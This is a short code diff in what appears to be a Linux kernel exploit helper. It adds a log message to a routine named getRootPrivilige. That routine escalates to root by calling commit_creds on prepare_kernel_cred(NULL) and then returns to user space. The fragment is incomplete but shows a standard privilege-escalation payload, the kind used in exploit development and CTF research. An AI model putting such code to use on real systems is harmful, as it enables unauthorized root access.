@@ -509,5 +509,6 @@ void getRootPrivilige()
     (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
     if(back2user==NULL)
         panic("[-] back2user is not set.");
+    xInfo("[n132] Here we go!");
     back2user();
 }
